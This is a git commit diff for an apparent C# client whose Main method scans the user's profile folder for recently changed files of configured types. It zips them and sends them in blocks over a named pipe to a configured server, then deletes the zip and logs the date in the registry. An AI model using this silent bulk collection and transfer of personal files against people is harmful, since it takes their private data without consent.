18c87937fd9d011b1858b889eda898fc55fb053d
Daitarus <chajkovskij_99@mail.ru@>
2023-01-31 10:57:42 +0300

    c13: autotransfer from User

---
+++ Client/FileTransport.cs
@@ -0,0 +1,47 @@
+﻿using CommandsKit;
+using PipeProtocolTransport;
+using System.IO;
+using System;
+using System.Text;
+
+namespace Client
+{
+    internal static class FileTransport
+    {
+        private static byte[] ReadFileBlock(FileStream fileStream, long start, int lengthBlock, long lengthFile)
+        {
+            if (lengthFile < start + lengthBlock)
+                lengthBlock = (int)(lengthFile - start);
+
+            byte[] fileBlock = new byte[lengthBlock];
+
+            fileStream.Seek(start, SeekOrigin.Begin);
+            fileStream.Read(fileBlock, 0, fileBlock.Length);
+
+            return fileBlock;
+        }
+
+        public static void SendFile(FileInfo fileInfo, PptClient client)
+        {
+            if (fileInfo.Exists)
+            {
+                byte[] fileInfoBytes = Encoding.UTF8.GetBytes(fileInfo.Name);
+
+                int maxLengthBlock = FileRequest.maxSizeInfoAndData - fileInfoBytes.Length;
+                int amountBlocks = (int)Math.Ceiling((double)fileInfo.Length / (double)maxLengthBlock);
+
+                using (FileStream fileStream = File.Open(fileInfo.FullName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                {
+                    for (int i = 0; i < amountBlocks; i++)
+                    {
+                        byte[] fileBlock = ReadFileBlock(fileStream, i * maxLengthBlock, maxLengthBlock, fileInfo.Length);
+                        Command com = new FileRequest(i, amountBlocks, fileInfoBytes, fileBlock);
+                        if (!client.SendCommand(com))
+                            break;
+                    }
+                }
+            }
+        }
+    }
+}
+
--- Client/Program.cs
+++ Client/Program.cs
@@ -1,21 +1,70 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Configuration;
+using Client;
+using System.IO;
+using System.Reflection;
+using System.Threading;
 using PipeProtocolTransport;
+using ScanFileSystem;
+using System.Linq;
 
 internal class Program
 {
     static void Main(string[] args)
     {
+        string corePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + '\\';
         string serverName = GetServerName(ConfigurationManager.AppSettings["server"]);
+        string[] extensions = GetExtensions(ConfigurationManager.AppSettings["extensions"]);
+
+        string dirName = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+        DirectoryInfo userDir = new DirectoryInfo(dirName);
 
         PptClient client = new PptClient("MyPipe", serverName, 10000);
 
-        //client.Start
+        int delayConnection = 5000;
+        while (!client.Start())
+        {
+            Thread.Sleep(delayConnection);
+            delayConnection += 5000;
+        }
 
-        //request to server ...
-        //EXAMPLE: FileTransport.SendFile(fileInfo, client);
+        DateTime lastDateTransfer = FileWork.GetDateFromRegistry();
+        List<FileInfo> files = ScanFiles.GetFiles(userDir);
+        files = FileWork.GetFilesForDate(files, lastDateTransfer);
+        files = FileWork.GetFilesForExtensions(files, extensions);
+
+        DateTime dateWrite = DateTime.Now;
+        string zipPath = $"{corePath}{Environment.UserName}_{String.Format("{0:yyyy-MM-dd_HH-mm}", dateWrite)}.zip";
+
+        if (files.Count() > 0)
+            FileWork.CopyToZip(zipPath, files, userDir.FullName);
+
+        FileInfo zipFile = new FileInfo(zipPath);
+        if (zipFile.Exists)
+        {
+            FileTransport.SendFile(zipFile, client);
+            zipFile.Delete();
+            FileWork.AddDateToRegistry(dateWrite);
+        }
 
         client.Close();
+    }
+    static string[] GetExtensions(string extensionsStr)
+    {
+        string[] extensions = new string[0];
+
+        if (!String.IsNullOrEmpty(extensionsStr))
+        {
+            extensions = extensionsStr.Split(';');
+            for (int i = 0; i < extensions.Length; i++)
+            {
+                if (extensions[i][0] != '.')
+                    extensions[i] = '.' + extensions[i];
+            }
+        }
+
+        return extensions;
     }
     static string GetServerName(string serverName)
     {
